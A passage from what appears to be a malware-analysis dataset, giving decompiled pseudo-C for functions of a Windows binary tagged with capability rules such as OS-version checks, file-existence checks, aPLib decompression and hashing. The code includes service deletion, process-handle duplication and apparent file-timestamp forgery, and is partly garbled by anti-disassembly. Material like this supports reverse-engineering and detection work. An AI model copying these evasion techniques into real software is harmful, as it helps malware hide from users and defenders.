&var_25fh;\n        for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        *puVar4 = 0;\n        *(puVar4 + 2) = 0;\n        noname_3 = 0;\n        uVar7 = 0x26;\n        uVar12 = 0;\n        uVar13 = 0;\n        uVar10 = SUB42(&var_260h, 0);\n        uVar11 = &var_260h >> 0x10;\n        uVar8 = 0;\n        uVar9 = 0;\n        iVar1 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)();\n        if (iVar1 != 0) {\n            fcn.004040e0(CONCAT22(uVar9, uVar8), CONCAT22(uVar11, uVar10), CONCAT22(uVar13, CONCAT11(uVar12, uVar7)), \n                         noname_3, unaff_ESI, iVar2, _var_260h, stack0xfffffda0, in_stack_fffffda4, in_stack_fffffda8, \n                         in_stack_fffffdac, in_stack_fffffdb0);\n            puVar4 = &var_15bh;\n            for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 1;\n            }\n            *puVar4 = 0;\n            *(puVar4 + 2) = 0;\n            (*_sym.imp.MSVCRT.dll_sprintf)();\n            var_14h = 0;\n            puVar4 = _sym.imp.KERNEL32.dll_Sleep;\n            do {\n                puVar5 = &var_58h;\n                for (iVar2 = 0x11; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar5 = 0;\n                    puVar5 = puVar5 + 1;\n                }\n                var_28h._0_2_ = 0;\n                var_10h = 0;\n                var_ch = 0;\n                var_58h = 0x44;\n                var_8h = 0;\n                var_2ch = 1;\n                var_4h = 0;\n                iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessA)();\n                if (iVar2 == 0) {\n                    return;\n                }\n                (*puVar4)();\n                (*_sym.imp.USER32.dll_EnumWindows)();\n                *puVar5 = *puVar4;\n                func_0x524021ae();\n                iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)();\n                uVar7 = (POPCOUNT(iVar1 - 0x102U & 0xff) & 1U) == 0;\n                iVar2 = extraout_ECX;\n                cVar3 = extraout_DL;\n                if (iVar1 - 0x102U == 0) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(var_10h, 1);\n                    iVar2 = extraout_ECX_00;\n                    cVar3 = extraout_DL_00;\n                }\n                puVar6 = _sym.imp.KERNEL32.dll_CloseHandle;\n                if ((uVar7) || (!uVar7)) {\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(var_ch);\n                }\n                else {\n                    *(unaff_EBX + 0x3d8bf44d) = *(unaff_EBX + 0x3d8bf44d) | 0xffffff84;\n                    *(iVar2 + -1) = *(iVar2 + -1) + cVar3;\n                    puVar6 = puVar5 + 1;\n                }\n                (*puVar6)(var_10h);\n                var_14h = var_14h + 1;\n                puVar4 = puVar4 + 1;\n            } while (var_14h < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1310
    },
    "00403370": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004035c0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004035c0(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)();\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return uVar2;\n}\n",
        "token_count": 126
    },
    "null": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004013b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004013ed) overlaps instruction at (ram,0x004013ec)\n// \n\nint32_t __cdecl fcn.004013b0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t *unaff_EBX;\n    bool bVar2;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    bVar2 = (POPCOUNT(iVar1 + 1U & 0xff) & 1U) == 0;\n    if (iVar1 + 1U != 0) {\n        if ((bVar2) || (!bVar2)) {\n            iVar1 = 0;\n        }\n        *unaff_EBX = *unaff_EBX ^ 0xffffffc0;\n        return iVar1;\n    }\n    return 1;\n}\n",
        "token_count": 195
    },
    "00401600": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401620) overlaps instruction at (ram,0x0040161c)\n// \n\nuint __cdecl fcn.00401600(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint8_t in_AL;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    char *pcVar6;\n    uint8_t unaff_BL;\n    uchar **unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t **unaff_EDI;\n    uchar in_CF;\n    char in_ZF;\n    uint hObject;\n    uchar *puStack4;\n    \n    while( true ) {\n        puStack4 = unaff_EBP;\n        if ((in_CF) || (!in_CF)) break;\n        in_ECX = in_ECX + -1;\n        if (in_ECX == 0 || in_ZF == '\\0') {\n            iVar3 = *unaff_ESI;\n            *unaff_EDI = unaff_ESI + 1;\n            uVar1 = *0x9750e2b5;\n            pcVar6 = iVar3 >> 0x1f;\n            *pcVar6 = (*pcVar6 - (iVar3 >> 0x27)) - in_CF;\n            uVar2 = uVar1 + (in_ECX >> 8);\n            pcVar6 = uVar1 & 0xffffff00 | uVar2;\n            *pcVar6 = *pcVar6 + uVar2;\n            goto code_r0x0040162a;\n        }\n        in_CF = false;\n        unaff_BL = unaff_BL ^ in_AL;\n        in_ZF = unaff_BL == 0;\n        unaff_EBP = &puStack4;\n    }\n    pcVar6 = fcn.00404430(0x423218);\ncode_r0x0040162a:\n    if (pcVar6 == 0xffffffff) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, pcVar6);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(noname_0, iVar3, 0, 0, 0, 2);\n    iVar5 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar4);\n    if (iVar5 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    return 1;\n}\n",
        "token_count": 619
    },
    "004016c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004031f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040320f) overlaps instruction at (ram,0x0040320b)\n// \n\nbool fcn.004031f0(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    if ((*0x10 == 0x110 || &stack0xfffffffc < 0x10c) ||\n       (*0x10 != 0x110 && SBORROW4(&stack0xfffffffc, 0x10c) == &var_10ch < 0)) {\n        in_EAX = &var_4h;\n    }\n    iVar1 = fcn.00403370(0x80000002, 0x42348c, 0x4234cc, &var_8h, &var_10ch, in_EAX);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n        return iVar1 != -1;\n    }\n    return false;\n}\n",
        "token_count": 262
    },
    "00403ee0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00403ee0(void)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00404b00(0x4231ac);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 98
    },
    "00404430": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040448d) overlaps instruction at (ram,0x0040448b)\n// \n// WARNING: Removing unreachable block (ram,0x00404478)\n// WARNING: Removing unreachable block (ram,0x0040447e)\n// WARNING: Removing unreachable block (ram,0x0040447f)\n// WARNING: Removing unreachable block (ram,0x00404487)\n\nuint __cdecl fcn.00404430(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    bool bVar6;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar2 = (**0x423664)(2, 0);\n    if (iVar2 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar5 = &var_128h;\n    for (iVar4 = 0x49; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    uVar3 = (**0x423668)(iVar2, &var_12ch);\n    pcVar1 = _sym.imp.MSVCRT.dll__stricmp;\n    do {\n        if (uVar3 == 0) {\ncode_r0x004044f7:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            return var_4h;\n        }\n        bVar6 = (POPCOUNT(uVar3 & 0xff) & 1U) != 0;\n        if ((bVar6) && (!bVar6)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        iVar4 = (*pcVar1)(&var_108h, arg_8h);\n        if (iVar4 == 0) {\n            var_4h = var_124h;\n            goto code_r0x004044f7;\n        }\n        uVar3 = (**0x42366c)(iVar2, &var_12ch);\n    } while( true );\n}\n",
        "token_count": 553
    },
    "00404940": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404a21) overlaps instruction at (ram,0x00404a1e)\n// \n// WARNING: Removing unreachable block (ram,0x00404ade)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl\nfcn.00404940(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    bool bVar3;\n    ulong uVar4;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar3 = false;\n    uVar4 = fcn.00403960(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    iVar1 = uVar4 >> 0x20;\n    if ((bVar3) || (!bVar3)) {\n        iVar1 = arg_20h + 0x60;\n    }\n    else {\n        arg_ch = CONCAT31(uVar4 >> 8, 0x98) | 0x8d;\n    }\n    fcn.00403960(arg_18h, arg_1ch, arg_ch, 0x20, iVar1);\n    fcn.00403960(arg_18h, arg_1ch, arg_10h, 0x20, arg_20h + 0xa0);\n    fcn.00403960(arg_18h, arg_1ch, arg_14h, 0x20, arg_20h + 0xe0);\n    if ((&stack0xfffffeac < 0xffffffec) && (&stack0xfffffeac >= 0xffffffec)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar1 = func_0x004048f0();\n    if (iVar1 == -1) {\n        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x120) = iVar1 % 5;\n    }\n    else {\n        *(arg_20h + 0x120) = iVar1;\n    }\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    var_4h = 0x104;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.00403370(0x80000001);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)();\n        if (iVar1 == 0) {\n            *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n        }\n    }\n    return;\n}\n",
        "token_count": 713
    },
    "00404b40": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404b40(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    ushort extraout_DX;\n    uint *puVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    bool bVar12;\n    unkbyte6 Var13;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint var_1ch;\n    uint var_14h;\n    int32_t var_4h;\n    \n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_12ch = '\\0';\n    puVar5 = &var_12bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uVar3 = 0xffffffff;\n    pcVar9 = &lpBuffer;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar8 + -uVar3;\n    puVar11 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar11 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x4231e4;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = &var_12ch;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar11 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_12ch, 0, &var_28h);\n    Var13 = CONCAT24(extraout_DX, var_4h);\n    bVar12 = arg_ch == -1;\n    if (bVar12) {\n        Var13 = fcn.00404b00(arg_8h);\n        bVar12 = Var13 == -1;\n        if (bVar12) {\n            return 0;\n        }\n    }\n    puVar6 = Var13;\n    puVar7 = puVar6;\n    if ((!bVar12) && (bVar12)) {\n        puVar7 = puVar6 + 1;\n        out(*puVar6, Var13 >> 0x20);\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(puVar7, &lpCreationTime, &var_1ch, &var_14h);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar7);\n    }\n    return 1;\n}\n",
        "token_count": 1280
    },
    "00404cb0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404dfc) overlaps instruction at (ram,0x00404dfb)\n// \n// WARNING (jumptable): Unable to track spacebase fully for stack\n\nuint32_t fcn.00404cb0(void)\n\n{\n    int32_t *piVar1;\n    ushort uVar2;\n    int32_t iVar3;\n    char cVar9;\n    uint32_t uVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint uVar8;\n    uint8_t extraout_CL;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    char *pcVar10;\n    uchar uVar11;\n    char extraout_DL;\n    uint *unaff_ESI;\n    uint8_t *puVar12;\n    int32_t unaff_EDI;\n    bool bVar13;\n    uint8_t in_AF;\n    ulong uVar14;\n    unkbyte6 Var15;\n    uint *puStack260;\n    uint *puStack256;\n    uint32_t uStack168;\n    uchar *puStack164;\n    \n    puStack164 = &stack0xffffff70;\n    iVar3 = fcn.00401510();\n    if (iVar3 == 0) {\n        return 0;\n    }\n    uVar6 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    fcn.00404660();\n    iVar3 = fcn.00404430(0x423210);\n    if (iVar3 != -1) {\n        return 0;\n    }\n    fcn.00402bc0();\n    *0x42365c = 1;\n    uStack168 = uVar6;\n    uVar14 = fcn.00403ee0();\n    pcVar5 = uVar14 >> 0x20;\n    uVar4 = uVar14;\n    bVar13 = (POPCOUNT(uVar4 & 0xff) & 1U) == 0;\n    if (uVar4 != 0) {\n        return 0;\n    }\n    if ((bVar13) || (!bVar13)) {\n        in_AF = 0;\n        pcVar5 = pcVar5 & 0xffffff00;\n        iVar3 = 7;\n    }\n    else {\n        puVar7 = unaff_ESI + 1;\n        out(*unaff_ESI, uVar14 >> 0x20);\n        do {\n            cVar9 = uVar4 >> 8;\n            in_AF = 9 < (uVar4 & 0xf) | in_AF;\n            uVar4 = CONCAT31(CONCAT21(uVar4 >> 0x10, cVar9 - in_AF), -in_AF);\n            iVar3 = extraout_ECX;\n            unaff_ESI = puVar7;\n        } while (in_AF || cVar9 == *pcVar5);\n    }\n    piVar1 = unaff_EDI + pcVar5 * 2;\n    *piVar1 = (*piVar1 + 0x7b) - in_AF;\n    *(iVar3 + 0x32) = uVar4;\n    *(iVar3 + 7) = *(iVar3 + 7) >> (iVar3 & 0x1f);\n    uVar11 = SUB41(pcVar5, 0);\n    *(uVar6 - 0x20) = uVar11;\n    *(uVar6 - 0x80) = uVar11;\n    puVar7 = uVar6 - 0x1f;\n    for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    *(uVar6 - 0x60) = uVar11;\n    puVar7 = uVar6 - 0x7f;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    *(uVar6 - 0x40) = uVar11;\n    puVar7 = uVar6 - 0x5f;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    puVar7 = uVar6 - 0x3f;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    puStack260 = puVar7 + 3;\n    *(puVar7 + 2) = 0;\n    puStack164 = 0x404dd0;\n    Var15 = fcn.004024c0(uVar6 - 0x80, uVar6 - 0x60, uVar6 - 0x20, uVar6 - 0x40);\n    bVar13 = Var15 == 0;\n    if (bVar13) {\n        return 0;\n    }\n    if ((!bVar13) && (bVar13)) {\n        uVar8 = in(Var15 >> 0x20);\n        *puStack260 = uVar8;\n        if (&stack0xffffff70 < 1) {\n    // WARNING: Could not recover jumptable at 0x00404e66. Too many branches\n    // WARNING: Treating indirect jump as call\n            uVar6 = (*_sym.imp.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_)();\n            return uVar6;\n        }\n        *(uVar6 + 0xe851e04d) = *(uVar6 + 0xe851e04d) ^ extraout_CL;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar3 = fcn.00403640(uVar6 - 0x20);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    if ((-1 < iVar3) && (-1 >= iVar3)) {\n        pcVar5 = iVar3 + -0x723faa73;\n        pcVar10 = extraout_ECX_00 + -1;\n        if (pcVar10 != NULL && uVar6 != 0xffffffff) {\n            *pcVar10 = *pcVar10 + (pcVar5 >> 8);\n            *pcVar5 = *pcVar5 + pcVar5;\n            *(iVar3 + -0x723faa0f) = *(iVar3 + -0x723faa0f) + extraout_DL;\n            _pe_dos_header = &stack0xffffff70;\n            *(uVar6 - 0x17) = &stack0xfffffefc;\n            *(uVar6 - 3) = 0;\n            puStack256 = unaff_ESI;\n            (*_sym.imp.MSVCRT.dll___set_app_type)(2);\n            *0x423680 = 0xffffffff;\n            *0x423684 = 0xffffffff;\n            puVar7 = (*_sym.imp.MSVCRT.dll___p__fmode)();\n            *puVar7 = *0x42367c;\n            puVar7 = (*_sym.imp.MSVCRT.dll___p__commode)();\n            *puVar7 = *0x423678;\n            *0x423688 = *_sym.imp.MSVCRT.dll__adjust_fdiv;\n            fcn.00404feb();\n            if (*0x423630 == 0) {\n                (*_sym.imp.MSVCRT.dll___setusermatherr)(0x404fe8);\n            }\n            fcn.00404fd6();\n            sub.MSVCRT.dll__initterm(0x407008, 0x40700c);\n            *(uVar6 - 0x6b) = *0x423674;\n            (*_sym.imp.MSVCRT.dll___getmainargs)(uVar6 - 0x5f, uVar6 - 0x6f, uVar6 - 99, *0x423670, uVar6 - 0x6b);\n            sub.MSVCRT.dll__initterm(0x407000, 0x407004);\n            puVar12 = *_sym.imp.MSVCRT.dll__acmdln;\n            *(uVar6 - 0x73) = puVar12;\n            if (*puVar12 != 0x22) {\n                do {\n                    if (*puVar12 < 0x21) goto code_r0x00404f5f;\n                    puVar12 = puVar12 + 1;\n                    *(uVar6 - 0x73) = puVar12;\n                } while( true );\n            }\n            do {\n                puVar12 = puVar12 + 1;\n                *(uVar6 - 0x73) = puVar12;\n                if (*puVar12 == 0) break;\n            } while (*puVar12 != 0x22);\n            if (*puVar12 != 0x22) goto code_r0x00404f5f;\n            do {\n                puVar12 = puVar12 + 1;\n                *(uVar6 - 0x73) = puVar12;\ncode_r0x00404f5f:\n            } while ((*puVar12 != 0) && (*puVar12 < 0x21));\n            *(uVar6 - 0x2f) = 0;\n            (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(uVar6 - 0x5b);\n            if ((*(uVar6 - 0x2f) & 1) == 0) {\n                uVar2 = 10;\n            }\n            else {\n                uVar2 = *(uVar6 - 0x2b);\n            }\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0, 0, puVar12, uVar2);\n            uVar8 = main(uVar8);\n            *(uVar6 - 0x67) = uVar8;\n            (*_sym.imp.MSVCRT.dll_exit)(uVar8);\n            puVar7 = *(uVar6 - 0x13);\n            uVar8 = **puVar7;\n            *(uVar6 - 0x77) = uVar8;\n            uVar6 = sub.MSVCRT.dll__XcptFilter(uVar8, puVar7);\n            return uVar6;\n        }\n    }\n    iVar3 = fcn.00403bf0();\n    return iVar3 != 0;\n}\n",
        "token_count": 2451
    },
    "00401400": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004014ea) overlaps instruction at (ram,0x004014e5)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00401400(uint param_1, int32_t param_2, uint param_3, int32_t *param_4)\n\n{\n    char unaff_00023900;\n    uchar *unaff_00023b00;\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint *puVar8;\n    uint16_t uVar9;\n    uint32_t unaff_EDI;\n    bool bVar10;\n    int32_t aiStackY2734 [674];\n    uint uStackY36;\n    \n    uStackY36 = 0x40142e;\n    uVar2 = fcn.00403f30(0, param_1, param_2 + 1U >> 1);\n    uVar2 = uVar2 & 0xffff;\n    if ((uVar2 != 0) && (uVar2 == 0)) {\n        uVar2 = unaff_EDI;\n    }\n    iVar3 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    uVar6 = *(iVar3 + 0x58);\n    uVar4 = uVar6;\n    uVar9 = uVar2;\n    if (uVar9 < uVar4) {\n        if ((uVar4 < uVar9) && (uVar9 <= uVar4)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        iVar3 = (uVar2 - uVar6 & 0xffff) - 1;\n    }\n    else {\n        iVar3 = uVar2 - (uVar6 & 0xffff);\n    }\n    uVar2 = uVar6 >> 0x10;\n    if (iVar3 < uVar6 >> 0x10) {\n        uVar6 = iVar3 - uVar2 & 0xffff;\n        bVar10 = SBORROW4(uVar6, 1);\n        iVar5 = uVar6 - 1;\n    }\n    else {\n        bVar10 = SBORROW4(iVar3, uVar2);\n        iVar5 = iVar3 - uVar2;\n    }\n    if ((iVar5 == 0 || bVar10 != iVar5 < 0) || (iVar5 != 0 && bVar10 == iVar5 < 0)) {\n        *param_4 = iVar5 + param_2;\n    }\n    else {\n        *(uVar2 + 0x8b39da56) = *(uVar2 + 0x8b39da56) ^ iVar5;\n        puVar8 = &stack0xfffffffd;\n        unaff_00023900 = '\\x10';\n        unaff_00023b00 = &stack0xffffffe3;\n        puVar7 = &stack0xffffffe3;\n        cVar1 = '\\x0f';\n        do {\n            puVar8 = puVar8 + -1;\n            puVar7 = puVar7 + -1;\n            *puVar7 = *puVar8;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    iVar5 = (unaff_00023900 - 1) * -4;\n    *(&stack0xffffffe3 + iVar5) = unaff_00023b00;\n    *(&stack0xfffff556 + iVar5) = param_1;\n    *(&stack0xfffff552 + iVar5) = iVar3;\n    **(unaff_00023b00 + 0x10) = *(*(unaff_00023b00 + -4) + 0x58);\n    return;\n}\n",
        "token_count": 869
    },
    "00403f30": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403f66) overlaps instruction at (ram,0x00403f65)\n// \n\nint32_t __cdecl fcn.00403f30(uint32_t arg_8h, uint16_t *arg_ch, uint8_t *arg_10h)\n\n{\n    bool bVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint32_t in_EAX;\n    uint32_t in_ECX;\n    int32_t unaff_EBX;\n    int32_t unaff_ESI;\n    uint8_t *unaff_EDI;\n    uint8_t in_CF;\n    uint8_t in_AF;\n    bool in_SF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    \n    if ((in_SF) || (!in_SF)) {\n        in_ECX = arg_8h;\n    }\n    bVar1 = CARRY4(in_EAX + 0x84d8b2f, in_CF);\n    uVar3 = in_EAX + 0x84d8b2f + in_CF;\n    if ((0xf7b274d0 < in_EAX || bVar1) || (0xf7b274d0 >= in_EAX && !bVar1)) {\n        if (arg_10h == NULL) goto code_r0x00403fc3;\n    }\n    else {\n        arg_10h = unaff_EDI + 1;\n        cVar2 = uVar3 - *unaff_EDI;\n        arg_ch = unaff_ESI + -1;\n        func_0x10189ed8((in_NT & 1) * 0x4000 | SBORROW1(uVar3, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                        (in_TF & 1) * 0x100 | (cVar2 < '\\0') * 0x80 | (cVar2 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                        ((POPCOUNT(cVar2) & 1U) == 0) * 4 | uVar3 < *unaff_EDI);\n        in_ECX = unaff_EBX + 0x758b1045;\n        *(unaff_ESI + 0x52) = 0;\n    }\n    do {\n        in_ECX = in_ECX + 